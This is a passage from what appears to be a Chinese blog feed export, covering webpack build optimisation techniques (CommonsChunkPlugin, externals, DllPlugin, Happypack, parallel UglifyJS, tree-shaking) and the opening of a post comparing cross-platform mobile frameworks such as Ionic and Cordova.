punctuation">(</span>cb<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取所有的模块</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span> callbacks<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            cb <span class="token operator">=</span> callbacks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">cb</span><span class="token punctuation">(</span>moduleOutdatedDependencies<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//执行代码模块</span>        <span class="token punctuation">}</span>        <span class="token operator">...</span>    <span class="token punctuation">}</span>    <span class="token operator">...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="手写webpack构建工具"><a href="#手写webpack构建工具" class="headerlink" title="手写webpack构建工具"></a>手写webpack构建工具</h2><h3 id="手写webpack流程"><a href="#手写webpack流程" class="headerlink" title="手写webpack流程"></a>手写webpack流程</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3g62fknvj31ok0lq4a4.jpg" alt="image-20210128153623321"></p><h3 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h3><h4 id="AST-Abstract-Syntax-Tree"><a href="#AST-Abstract-Syntax-Tree" class="headerlink" title="AST(Abstract Syntax Tree)"></a>AST(Abstract Syntax Tree)</h4><p>抽象语法树，源代码语法结构的一种抽象表示</p><ul><li>以树状的形式表现编程语言的语法结构 </li><li>树上的每个节点都表示源代码中的一种结构</li></ul><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3m52v4ghj31jk0l8ay2.jpg" alt="image-20210128190259694"></p><h4 id="AST生成过程"><a href="#AST生成过程" class="headerlink" title="AST生成过程"></a>AST生成过程</h4><p>抽象语法树的生成主要依靠的是Javascript Parser(js解析器)</p><ul><li>词法分析（Lexical Analysis） </li><li>语法分析（Parse Analysis）</li></ul><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3m9baz2zj31lj0u0tzs.jpg" alt="image-20210128190704960"></p><h3 id="在手写webpack中使用"><a href="#在手写webpack中使用" class="headerlink" title="在手写webpack中使用"></a>在手写webpack中使用</h3><h4 id="通过Visitor完成依赖的收集"><a href="#通过Visitor完成依赖的收集" class="headerlink" title="通过Visitor完成依赖的收集"></a>通过Visitor完成依赖的收集</h4><p>访问者（visitor）是一个用于 AST 遍历的跨语言模式，定义 了用于在一个树状结构中获取具体节点的方法</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3mb7ry01j31k60cc4e0.jpg" alt="image-20210128190855377"></p><h4 id="树的宽度优先搜索（BFS）算法思想"><a href="#树的宽度优先搜索（BFS）算法思想" class="headerlink" title="树的宽度优先搜索（BFS）算法思想"></a>树的宽度优先搜索（BFS）算法思想</h4><p>应用于循环分析依赖   </p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3mbwtqejj31k20l8wxx.jpg" alt="image-20210128190936336"></p><h4 id="树的宽度优先搜索（BFS）算法思想-1"><a href="#树的宽度优先搜索（BFS）算法思想-1" class="headerlink" title="树的宽度优先搜索（BFS）算法思想"></a>树的宽度优先搜索（BFS）算法思想</h4><p>循环分析结果  </p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3mcxcbwkj31ee0ma1kx.jpg" alt="image-20210128191032396"></p><h4 id="打包结果为一个IIFE"><a href="#打包结果为一个IIFE" class="headerlink" title="打包结果为一个IIFE"></a>打包结果为一个IIFE</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3mdeurxgj31ja0nwe11.jpg" alt="image-20210128191102224"></p><h4 id="打包结果分析"><a href="#打包结果分析" class="headerlink" title="打包结果分析"></a>打包结果分析</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3mdxzohgj31m20pgwy8.jpg" alt="image-20210128191133160"></p><h4 id="结果运行分析"><a href="#结果运行分析" class="headerlink" title="结果运行分析"></a>结果运行分析</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3mek1pz8j31lq0q07po.jpg" alt="image-20210128191208190"></p><h2 id="webpack构建优化"><a href="#webpack构建优化" class="headerlink" title="webpack构建优化"></a>webpack构建优化</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>如今前端工程化的概念早已经深入人心，选择一款合适的编译和资源管理工具已经成为了所有前端工程中的标配，而在诸多的构建工具中，webpack以其丰富的功能和灵活的配置而深受业内吹捧，逐步取代了grunt和gulp成为大多数前端工程实践中的首选，React，Vue，Angular等诸多知名项目也都相继选用其作为官方构建工具，极受业内追捧。但是，随者工程开发的复杂程度和代码规模不断地增加，webpack暴露出来的各种性能问题也愈发明显，极大的影响着开发过程中的体验。</p><p><img src="https://img.58cdn.com.cn/escstatic/docs/images/1576030107882.png" alt></p><h3 id="问题归纳"><a href="#问题归纳" class="headerlink" title="问题归纳"></a>问题归纳</h3><p>历经了多个web项目的实战检验，我们对webapck在构建中逐步暴露出来的性能问题归纳主要有如下几个方面：</p><p>代码全量构建速度过慢，即使是很小的改动，也要等待长时间才能查看到更新与编译后的结果（引入HMR热更新后有明显改进）；<br>随着项目业务的复杂度增加，工程模块的体积也会急剧增大，构建后的模块通常要以M为单位计算；<br>多个项目之间共用基础资源存在重复打包，基础库代码复用率不高；<br>node的单进程实现在耗cpu计算型loader中表现不佳；<br>针对以上的问题，我们来看看怎样利用webpack现有的一些机制和第三方扩展插件来逐个击破。</p><h3 id="慢在何处"><a href="#慢在何处" class="headerlink" title="慢在何处"></a>慢在何处</h3><p>作为工程师，我们一直鼓励要理性思考，用数据和事实说话，“我觉得很慢”，“太卡了”，“太大了”之类的表述难免显得太笼统和太抽象，那么我们不妨从如下几个方面来着手进行分析：</p><p><img src="https://img.58cdn.com.cn/escstatic/docs/images/1576030153413.png" alt></p><p>从项目结构着手，代码组织是否合理，依赖使用是否合理；<br>从webpack自身提供的优化手段着手，看看哪些api未做优化配置；<br>从webpack自身的不足着手，做有针对性的扩展优化，进一步提升效率；<br>在这里我们推荐使用一个wepback的可视化资源分析工具：webpack-bundle-analyzer，在webpack构建的时候会自动帮你计算出各个模块在你的项目工程中的依赖与分布情况，方便做更精确的资源依赖和引用的分析。</p><p>从上图中我们不难发现大多数的工程项目中，依赖库的体积永远是大头，通常体积可以占据整个工程项目的7-9成，而且在每次开发过程中也会重新读取和编译对应的依赖资源，这其实是很大的的资源开销浪费，而且对编译结果影响微乎其微，毕竟在实际业务开发中，我们很少会去主动修改第三方库中的源码，改进方案如下：</p><h3 id="方案一、合理配置-CommonsChunkPlugin"><a href="#方案一、合理配置-CommonsChunkPlugin" class="headerlink" title="方案一、合理配置 CommonsChunkPlugin"></a>方案一、合理配置 CommonsChunkPlugin</h3><p>webpack的资源入口通常是以entry为单元进行编译提取，那么当多entry共存的时候，CommonsChunkPlugin的作用就会发挥出来，对所有依赖的chunk进行公共部分的提取，但是在这里可能很多人会误认为抽取公共部分指的是能抽取某个代码片段，其实并非如此，它是以module为单位进行提取。</p><p>假设我们的页面中存在entry1，entry2，entry3三个入口，这些入口中可能都会引用如utils，loadash，fetch等这些通用模块，那么就可以考虑对这部分的共用部分机提取。通常提取方式有如下四种实现：</p><h4 id="1、传入字符串参数，由chunkplugin自动计算提取"><a href="#1、传入字符串参数，由chunkplugin自动计算提取" class="headerlink" title="1、传入字符串参数，由chunkplugin自动计算提取"></a>1、传入字符串参数，由chunkplugin自动计算提取</h4><pre><code>new webpack.optimize.CommonsChunkPlugin(&#39;common.js&#39;)</code></pre><p>这种做法默认会把所有入口节点的公共代码提取出来, 生成一个<code>common.js</code></p><h4 id="2、有选择的提取公共代码"><a href="#2、有选择的提取公共代码" class="headerlink" title="2、有选择的提取公共代码"></a>2、有选择的提取公共代码</h4><pre><code>new webpack.optimize.CommonsChunkPlugin(&#39;common.js&#39;,[&#39;entry1&#39;,&#39;entry2&#39;]);</code></pre><p>只提取<code>entry1</code>节点和<code>entry2</code>中的共用部分模块, 生成一个<code>common.js</code></p><h4 id="3、将entry下所有的模块的公共部分（可指定引用次数）提取到一个通用的chunk中"><a href="#3、将entry下所有的模块的公共部分（可指定引用次数）提取到一个通用的chunk中" class="headerlink" title="3、将entry下所有的模块的公共部分（可指定引用次数）提取到一个通用的chunk中"></a>3、将entry下所有的模块的公共部分（可指定引用次数）提取到一个通用的chunk中</h4><pre><code>new webpack.optimize.CommonsChunkPlugin({    name: &#39;vendors&#39;,    minChunks: function (module, count) {       return (          module.resource &amp;&amp;          /\.js$/.test(module.resource) &amp;&amp;          module.resource.indexOf(            path.join(__dirname, &#39;../node_modules&#39;)          ) === 0       )    }});</code></pre><p>提取所有<code>node_modules</code>中的模块至<code>vendors</code>中，也可以指定<code>minChunks</code>中的最小引用数；</p><h4 id="4、抽取enry中的一些lib抽取到vendors中"><a href="#4、抽取enry中的一些lib抽取到vendors中" class="headerlink" title="4、抽取enry中的一些lib抽取到vendors中"></a>4、抽取enry中的一些lib抽取到vendors中</h4><pre><code>entry = {    vendors: [&#39;fetch&#39;, &#39;loadash&#39;]};new webpack.optimize.CommonsChunkPlugin({    name: &quot;vendors&quot;,    minChunks: Infinity});</code></pre><p>添加一个<code>entry</code>名叫为<code>vendors</code>，并把<code>vendors</code>设置为所需要的资源库，<code>CommonsChunk</code>会自动提取指定库至<code>vendors</code>中。</p><h3 id="方案二、通过-externals-配置来提取常用库"><a href="#方案二、通过-externals-配置来提取常用库" class="headerlink" title="方案二、通过 externals 配置来提取常用库"></a>方案二、通过 externals 配置来提取常用库</h3><p>在实际项目开发过程中，我们并不需要实时调试各种库的源码，这时候就可以考虑使用external选项了。</p><p><img src="https://img.58cdn.com.cn/escstatic/docs/images/1576030313974.jpeg" alt></p><p>简单来说external就是把我们的依赖资源声明为一个外部依赖，然后通过script外链脚本引入。这也是我们早期页面开发中资源引入的一种翻版，只是通过配置后可以告知webapck遇到此类变量名时就可以不用解析和编译至模块的内部文件中，而改用从外部变量中读取，这样能极大的提升编译速度，同时也能更好的利用CDN来实现缓存。</p><p>external的配置相对比较简单，只需要完成如下三步：</p><h4 id="1、在页面中加入需要引入的lib地址，如下："><a href="#1、在页面中加入需要引入的lib地址，如下：" class="headerlink" title="1、在页面中加入需要引入的lib地址，如下："></a>1、在页面中加入需要引入的lib地址，如下：</h4><pre><code>&lt;head&gt;&lt;script src=&quot;//cdn.bootcss.com/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;//cdn.bootcss.com/underscore.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/common/react.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/common/react-dom.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/common/react-router.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/common/immutable.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;</code></pre><h4 id="2、在webapck-config-js中加入external配置项："><a href="#2、在webapck-config-js中加入external配置项：" class="headerlink" title="2、在webapck.config.js中加入external配置项："></a>2、在webapck.config.js中加入external配置项：</h4><pre><code>module.export = {    externals: {        &#39;react-router&#39;: {            amd: &#39;react-router&#39;,            root: &#39;ReactRouter&#39;,            commonjs: &#39;react-router&#39;,            commonjs2: &#39;react-router&#39;        },        react: {            amd: &#39;react&#39;,            root: &#39;React&#39;,            commonjs: &#39;react&#39;,            commonjs2: &#39;react&#39;        },        &#39;react-dom&#39;: {            amd: &#39;react-dom&#39;,            root: &#39;ReactDOM&#39;,            commonjs: &#39;react-dom&#39;,            commonjs2: &#39;react-dom&#39;        }    }}</code></pre><p>这里要提到的一个细节是：此类文件在配置前，构建这些资源包时需要采用<code>amd/commonjs/cmd</code>相关的模块化进行兼容封装，即打包好的库已经是umd模式包装过的，如在<code>node_modules/react-router</code>中我们可以看到umd/ReactRouter.js之类的文件，只有这样<code>webpack</code>中的<code>require</code>和<code>import * from &#39;xxxx&#39;</code>才能正确读到该类包的引用，在这类js的头部一般也能看到如下字样：</p><p>if (typeof exports === ‘object’ &amp;&amp; typeof module === ‘object’) {<br>    module.exports = factory(require(“react”));<br>} else if (typeof define === ‘function’ &amp;&amp; define.amd) {<br>    define([“react”], factory);<br>} else if (typeof exports === ‘object’) {<br>    exports[“ReactRouter”] = factory(require(“react”));<br>} else {<br>    root[“ReactRouter”] = factory(root[“React”]);<br>}</p><h4 id="3、非常重要的是一定要在output选项中加入如下一句话："><a href="#3、非常重要的是一定要在output选项中加入如下一句话：" class="headerlink" title="3、非常重要的是一定要在output选项中加入如下一句话："></a>3、非常重要的是一定要在output选项中加入如下一句话：</h4><pre><code>output: {  libraryTarget: &#39;umd&#39;}</code></pre><p>由于通过<code>external</code>提取过的js模块是不会被记录到<code>webapck</code>的<code>chunk</code>信息中，通过libraryTarget可告知我们构建出来的业务模块，当读到了externals中的key时，需要以<code>umd</code>的方式去获取资源名，否则会有出现找不到module的情况。</p><p>通过配置后，我们可以看到对应的资源信息已经可以在浏览器的<code>source map</code>中读到了。</p><p><img src="https://img.58cdn.com.cn/escstatic/docs/images/1576030426901.png" alt></p><p>对应的资源也可以直接由页面外链载入，有效地减小了资源包的体积。</p><p><img src="https://img.58cdn.com.cn/escstatic/docs/images/1576030454254.jpeg" alt></p><h3 id="方案三、利用-DllPlugin-和-DllReferencePlugin-预编译资源模块"><a href="#方案三、利用-DllPlugin-和-DllReferencePlugin-预编译资源模块" class="headerlink" title="方案三、利用 DllPlugin 和 DllReferencePlugin 预编译资源模块"></a>方案三、利用 DllPlugin 和 DllReferencePlugin 预编译资源模块</h3><p>我们的项目依赖中通常会引用大量的npm包，而这些包在正常的开发过程中并不会进行修改，但是在每一次构建过程中却需要反复的将其解析，如何来规避此类损耗呢？这两个插件就是干这个用的。</p><p>简单来说DllPlugin的作用是预先编译一些模块，而DllReferencePlugin则是把这些预先编译好的模块引用起来。这边需要注意的是DllPlugin必须要在DllReferencePlugin执行前先执行一次，dll这个概念应该也是借鉴了windows程序开发中的dll文件的设计理念。</p><p>相对于<code>externals，dllPlugin</code>有如下几点优势：</p><ul><li>dll预编译出来的模块可以作为静态资源链接库可被重复使用，尤其适合多个项目之间的资源共享，如同一个站点pc和手机版等；</li><li>dll资源能有效地解决资源循环依赖的问题，部分依赖库如：<code>react-addons-css-transition-group</code>这种原先从react核心库中抽取的资源包，整个代码只有一句话：</li></ul><pre><code>module.exports = require(&#39;react/lib/ReactCSSTransitionGroup&#39;);</code></pre><p>却因为重新指向了react/lib中，这也会导致在通过externals引入的资源只能识别react,寻址解析react/lib则会出现无法被正确索引的情况。</p><ul><li>由于externals的配置项需要对每个依赖库进行逐个定制，所以每次增加一个组件都需要手动修改，略微繁琐，而通过dllPlugin则能完全通过配置读取，减少维护的成本；</li></ul><h4 id="1、配置dllPlugin对应资源表并编译文件"><a href="#1、配置dllPlugin对应资源表并编译文件" class="headerlink" title="1、配置dllPlugin对应资源表并编译文件"></a>1、配置dllPlugin对应资源表并编译文件</h4><p>那么externals该如何使用呢，其实只需要增加一个配置文件：<code>webpack.dll.config.js</code>：</p><pre><code>const webpack = require(&#39;webpack&#39;);const path = require(&#39;path&#39;);const isDebug = process.env.NODE_ENV === &#39;development&#39;;const outputPath = isDebug ? path.join(__dirname, &#39;../common/debug&#39;) : path.join(__dirname, &#39;../common/dist&#39;);const fileName = &#39;[name].js&#39;;// 资源依赖包，提前编译const lib = [  &#39;react&#39;,  &#39;react-dom&#39;,  &#39;react-router&#39;,  &#39;history&#39;,  &#39;react-addons-pure-render-mixin&#39;,  &#39;react-addons-css-transition-group&#39;,  &#39;redux&#39;,  &#39;react-redux&#39;,  &#39;react-router-redux&#39;,  &#39;redux-actions&#39;,  &#39;redux-thunk&#39;,  &#39;immutable&#39;,  &#39;whatwg-fetch&#39;,  &#39;byted-people-react-select&#39;,  &#39;byted-people-reqwest&#39;];const plugin = [  new webpack.DllPlugin({    /**     * path     * 定义 manifest 文件生成的位置     * [name]的部分由entry的名字替换     */    path: path.join(outputPath, &#39;manifest.json&#39;),    /**     * name     * dll bundle 输出到那个全局变量上     * 和 output.library 一样即可。     */    name: &#39;[name]&#39;,    context: __dirname  }),  new webpack.optimize.OccurenceOrderPlugin()];if (!isDebug) {  plugin.push(    new webpack.DefinePlugin({      &#39;process.env.NODE_ENV&#39;: JSON.stringify(&#39;production&#39;)    }),    new webpack.optimize.UglifyJsPlugin({      mangle: {        except: [&#39;$&#39;, &#39;exports&#39;, &#39;require&#39;]      },      compress: { warnings: false },      output: { comments: false }    })  )}module.exports = {  devtool: &#39;#source-map&#39;,  entry: {    lib: lib  },  output: {    path: outputPath,    filename: fileName,    /**     * output.library     * 将会定义为 window.${output.library}     * 在这次的例子中，将会定义为`window.vendor_library`     */    library: &#39;[name]&#39;,    libraryTarget: &#39;umd&#39;,    umdNamedDefine: true  },  plugins: plugin};</code></pre><p>然后执行命令：</p><pre><code>$ NODE_ENV=development webpack --config  webpack.dll.lib.js --progress$ NODE_ENV=production webpack --config  webpack.dll.lib.js --progress </code></pre><p>即可分别编译出支持调试版和生产环境中lib静态资源库，在构建出来的文件中我们也可以看到会自动生成如下资源：</p><pre><code>common├── debug │   ├── lib.js │   ├── lib.js.map │   └── manifest.json└── dist    ├── lib.js    ├── lib.js.map    └── manifest.json</code></pre><p>文件说明：</p><p>lib.js可以作为编译好的静态资源文件直接在页面中通过src链接引入，与externals的资源引入方式一样，生产与开发环境可以通过类似charles之类的代理转发工具来做路由替换；<br>manifest.json中保存了webpack中的预编译信息，这样等于提前拿到了依赖库中的chunk信息，在实际开发过程中就无需要进行重复编译；</p><h4 id="2、dllPlugin的静态资源引入"><a href="#2、dllPlugin的静态资源引入" class="headerlink" title="2、dllPlugin的静态资源引入"></a>2、dllPlugin的静态资源引入</h4><p>lib.js和manifest.json存在一一对应的关系，所以我们在调用的过程也许遵循这个原则，如当前处于开发阶段，对应我们可以引入common/debug文件夹下的lib.js和manifest.json，切换到生产环境的时候则需要引入common/dist下的资源进行对应操作，这里考虑到手动切换和维护的成本，我们推荐使用add-asset-html-webpack-plugin进行依赖资源的注入，可得到如下结果：</p><pre><code>&lt;head&gt;&lt;script src=&quot;/static/common/lib.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;在webpack.config.js文件中增加如下代码：const isDebug = (process.env.NODE_ENV === &#39;development&#39;);const libPath = isDebug ? &#39;../dll/lib/manifest.json&#39; : &#39;../dll/dist/lib/manifest.json&#39;;// 将mainfest.json添加到webpack的构建中module.export = {  plugins: [       new webpack.DllReferencePlugin({       context: __dirname,       manifest: require(libPath),      })  ]}</code></pre><p>配置完成后我们能发现对应的资源包已经完成了纯业务模块的提取</p><p><img src="https://img.58cdn.com.cn/escstatic/docs/images/1576030700114.png" alt></p><p>多个工程之间如果需要使用共同的lib资源，也只需要引入对应的lib.js和manifest.js即可，plugin配置中也支持多个<code>webpack.DllReferencePlugin</code>同时引入使用，如下：</p><pre><code>module.export = {  plugins: [     new webpack.DllReferencePlugin({        context: __dirname,        manifest: require(libPath),      }),      new webpack.DllReferencePlugin({        context: __dirname,        manifest: require(ChartsPath),      })  ]</code></pre><h3 id="方案四、使用-Happypack-加速你的代码构建"><a href="#方案四、使用-Happypack-加速你的代码构建" class="headerlink" title="方案四、使用 Happypack 加速你的代码构建"></a>方案四、使用 Happypack 加速你的代码构建</h3><p>以上介绍均为针对webpack中的chunk计算和编译内容的优化与改进，对资源的实际体积改进上也较为明显，那么除此之外，我们能否针对资源的编译过程和速度优化上做些尝试呢？</p><p>众所周知，webpack中为了方便各种资源和类型的加载，设计了以loader加载器的形式读取资源，但是受限于node的编程模型影响，所有的loader虽然以async的形式来并发调用，但是还是运行在单个 node的进程以及在同一个事件循环中，这就直接导致了当我们需要同时读取多个loader文件资源时，比如babel-loader需要transform各种jsx，es6的资源文件。在这种同步计算同时需要大量耗费cpu运算的过程中，node的单进程模型就无优势了，那么happypack就针对解决此类问题而生。</p><h4 id="开启happypack的线程池"><a href="#开启happypack的线程池" class="headerlink" title="开启happypack的线程池"></a>开启happypack的线程池</h4><p>happypack的处理思路是将原有的webpack对loader的执行过程从单一进程的形式扩展多进程模式，原本的流程保持不变，这样可以在不修改原有配置的基础上来完成对编译过程的优化，具体配置如下：</p><pre><code> const HappyPack = require(&#39;happypack&#39;); const os = require(&#39;os&#39;) const HappyThreadPool = HappyPack.ThreadPool({ size: os.cpus().length}); // 启动线程池});module:{    rules: [      {        test: /\.(js|jsx)$/,        // use: [&#39;babel-loader?cacheDirectory&#39;],        use: &#39;happypack/loader?id=jsx&#39;,        exclude: /^node_modules$/      }    ]  },  plugins:[    new HappyPack({     id: &#39;jsx&#39;,     cache: true,     threadPool: HappyThreadPool,     loaders: [&#39;babel-loader&#39;]   })  ]</code></pre><p>我们可以看到通过在loader中配置直接指向happypack提供的loader，对于文件实际匹配的处理 loader，则是通过配置在plugin属性来传递说明，这里happypack提供的loader与plugin的衔接匹配，则是通过<code>id=happybabel</code>来完成。配置完成后，laoder的工作模式就转变成了如下所示：</p><p><img src="https://img.58cdn.com.cn/escstatic/docs/images/1576030795462.png" alt></p><p>happypack在编译过程中除了利用多进程的模式加速编译，还同时开启了cache计算，能充分利用缓存读取构建文件，对构建的速度提升也是非常明显的，经过测试，最终的构建速度提升如下：</p><p>优化前：</p><p><img src="https://img.58cdn.com.cn/escstatic/docs/images/1576030827234.png" alt></p><p>优化后：</p><p><img src="https://img.58cdn.com.cn/escstatic/docs/images/1576030853961.png" alt></p><p>关于happyoack的更多介绍可以查看：</p><p><a href>happypack</a><br>｜<br><a href>happypack 原理解析</a></p><h3 id="方案五、增强-uglifyPlugin"><a href="#方案五、增强-uglifyPlugin" class="headerlink" title="方案五、增强 uglifyPlugin"></a>方案五、增强 uglifyPlugin</h3><p>uglifyJS凭借基于node开发，压缩比例高，使用方便等诸多优点已经成为了js压缩工具中的首选，但是我们在webpack的构建中观察发现，当webpack build进度走到80%前后时，会发生很长一段时间的停滞，经测试对比发现这一过程正是uglfiyJS在对我们的output中的bunlde部分进行压缩耗时过长导致，针对这块我们可以使用webpack-uglify-parallel来提升压缩速度。</p><p>从插件源码中可以看到，webpack-uglify-parallel的是实现原理是采用了多核并行压缩的方式来提升我们的压缩速度。</p><pre><code>plugin.nextWorker().send({    input: input,    inputSourceMap: inputSourceMap,    file: file,    options: options});plugin._queue_len++;if (!plugin._queue_len) {    callback();}               if (this.workers.length &lt; this.maxWorkers) {    var worker = fork(__dirname + &#39;/lib/worker&#39;);    worker.on(&#39;message&#39;, this.onWorkerMessage.bind(this));    worker.on(&#39;error&#39;, this.onWorkerError.bind(this));    this.workers.push(worker);}this._next_worker++;return this.workers[this._next_worker % this.maxWorkers];</code></pre><p>使用配置也非常简单，只需要将我们原来webpack中自带的uglifyPlugin配置：</p><pre><code>new webpack.optimize.UglifyJsPlugin({   exclude:/\.min\.js$/   mangle:true,   compress: { warnings: false },   output: { comments: false }})修改成如下代码即可：const os = require(&#39;os&#39;);    const UglifyJsParallelPlugin = require(&#39;webpack-uglify-parallel&#39;);    new UglifyJsParallelPlugin({      workers: os.cpus().length,      mangle: true,      compressor: {        warnings: false,        drop_console: true,        drop_debugger: true       }    })</code></pre><p>目前webpack官方也维护了一个支持多核压缩的UglifyJs插件：uglifyjs-webpack-plugin,使用方式类似，优势在于完全兼容webpack.optimize.UglifyJsPlugin中的配置，可以通过uglifyOptions写入，因此也做为推荐使用，参考配置如下：</p><pre><code> const UglifyJsPlugin = require(&#39;uglifyjs-webpack-plugin&#39;);  new UglifyJsPlugin({    uglifyOptions: {      ie8: false,      ecma: 8,      mangle: true,      output: { comments: false },      compress: { warnings: false }    },    sourceMap: false,    cache: true,    parallel: os.cpus().length * 2  })</code></pre><h3 id="方案六、Tree-shaking-amp-Scope-Hoisting"><a href="#方案六、Tree-shaking-amp-Scope-Hoisting" class="headerlink" title="方案六、Tree-shaking &amp; Scope Hoisting"></a>方案六、Tree-shaking &amp; Scope Hoisting</h3><p>wepback在2.X和3.X中从rolluo中借鉴了tree-shaking和Scope Hoisting，利用es6的module特性，利用AST对所有引用的模块和方法做了静态分析，从而能有效地剔除项目中的没有引用到的方法，并将相关方法调用归纳到了独立的webpack_module中，对打包构建的体积优化也较为明显，但是前提是所有的模块写法必须使用ES6 Module进行实现，具体配置参考如下：</p><pre><code> // .babelrc: 通过配置减少没有引用到的方法  {    &quot;presets&quot;: [      [&quot;env&quot;, {        &quot;targets&quot;: {          &quot;browsers&quot;: [&quot;last 2 versions&quot;, &quot;safari &gt;= 7&quot;]        }      }],      // https://www.zhihu.com/question/41922432      [&quot;es2015&quot;, {&quot;modules&quot;: false}]  // tree-shaking    ]  }  // webpack.config: Scope Hoisting  {    plugins:[      // https://zhuanlan.zhihu.com/p/27980441      new webpack.optimize.ModuleConcatenationPlugin()    ]  }</code></pre><h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><p>在实际的开发过程中，可灵活地选择适合自身业务场景的优化手段。</p><table><thead><tr><th>优化手段</th><th>开发环境</th><th>生产环境</th></tr></thead><tbody><tr><td>CommonsChunk</td><td>√</td><td>√</td></tr><tr><td>externals</td><td></td><td>√</td></tr><tr><td>DllPlugin</td><td>√</td><td>√</td></tr><tr><td>Happypack</td><td>√</td><td></td></tr><tr><td>uglify-parallel</td><td></td><td>√</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 大前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨平台技术对比</title>
      <link href="2021/02/02/%E8%B7%A8%E5%B9%B3%E5%8F%B0%E6%8A%80%E6%9C%AF%E5%AF%B9%E6%AF%94/"/>
      <url>2021/02/02/%E8%B7%A8%E5%B9%B3%E5%8F%B0%E6%8A%80%E6%9C%AF%E5%AF%B9%E6%AF%94/</url>
      
        <content type="html"><![CDATA[<h2 id="跨平台技术发展的三个阶段"><a href="#跨平台技术发展的三个阶段" class="headerlink" title="跨平台技术发展的三个阶段"></a>跨平台技术发展的三个阶段</h2><ul><li><p>第一阶段是混合开发的web容器时代</p><ul><li>为了解决原生开发的高成本、低效率，出现了Hybrid混合开发</li><li>原生中嵌入依托于浏览器的WebView</li><li>Web浏览器中可以实现的需求在WebView中基本都可以实现</li><li>但是Web最大的问题是，它的性能和体验与原生开发存在肉眼可感知的差异</li><li>因此并不适用于对性能和用户体验要求较高的场景</li></ul></li><li><p>第二阶段是以RN和Weex为代表的泛web容器时代</p><ul><li>RN对Web标准进行了功能裁剪</li><li>用户体验更接近于原生了</li><li>由于进行了功能裁剪，所以RN对业务的支持能力还不到浏览器的5%</li><li>因此仅适用于中低复杂度的低交互类页面。面对稍微复杂一点儿的交互和动画需求，都需要通过调用原生代码去扩展才能实现</li></ul></li><li><p>第三阶段是以Flutter为代表的自绘引擎时代</p><ul><li>Flutter是构建Google物联网操作系统Fuchsia的SDK</li><li>它使用Dart语言开发APP</li><li>一套代码可以同时运行在iOS和Android平台上</li><li>Flutter采用自带的Native渲染引擎渲染视图，它是自己完成了组件渲染的闭环</li><li>而RN、Weex之类的框架，只是通过JavaScript虚拟机扩展调用系统组件，最后是由Android或者iOS系统来完成组件的渲染</li></ul></li></ul><p>下面来看一下几类型的混合开发APP：</p><h2 id="Web-APP框架"><a href="#Web-APP框架" class="headerlink" title="Web APP框架"></a>Web APP框架</h2><h3 id="ionic"><a href="#ionic" class="headerlink" title="ionic"></a>ionic</h3><p>Ionic框架是基于Web技术应用HTML、CSS以及Java技术进行智能设备APP开发的框架，Ionic框架是用来开发混合模式的移动APP开发框架；</p><h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><ul><li>全套的UI组件<br>Ionic框架很注重外观的体验，所以它提供了很多UI组件帮助开发者开发APP，比如：下拉刷新、标签等。界面美观，开发者能够很快的上手，开发的APP都很实用。</li><li>代码容易维护<br>Ionic框架是基于AngularJS，也就支持AngularJS的特点，遵循标准的代码，维护代码就很容易，能够完美融合AngularJS</li><li>支持跨平台<br>可以在主流的Android操作系统和ios操作系统上运行，或者其他的操作系统也可以支持</li><li>很多强大的命令行</li><li>强大的社区、框架适用范围广<br>能够编译成各个平台的应用程序</li></ul><h4 id="劣势"><a href="#劣势" class="headerlink" title="劣势"></a>劣势</h4><ul><li>内存占用高</li><li>不适合做游戏类型app</li><li>web技术无法解决一切问题，对于比较耗性能的地方无法利用native的思维实现优势互补，如高体验的交互，动画等</li></ul><h3 id="Cordova"><a href="#Cordova" class="headerlink" title="Cordova"></a>Cordova</h3><p>Cordova提供了一组设备相关的API；通过这组API，移动应用能够以JavaScript访问原生的设备功能，如摄像头、麦克风等；Cordova还提供了一组统一的JavaScript类库，以及为这些类库所用的设备相关的原生后台代码；Cordova支持如下移动操作系统：iOS, Android,ubuntu phone os, Blackberry, Windows Phone, Palm WebOS, Bada 和 Symbian。</p><h4 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h4><ul><li><p>通信原理</p><ol><li>保存Cordova_plugin.js的 插件文件名字和地址</li><li>插件的API呼出时，通过调用Cordova的exec模块将API的参数保存在CommandQueue的队列中。  CALLBACK则保存在JS侧的callbacks 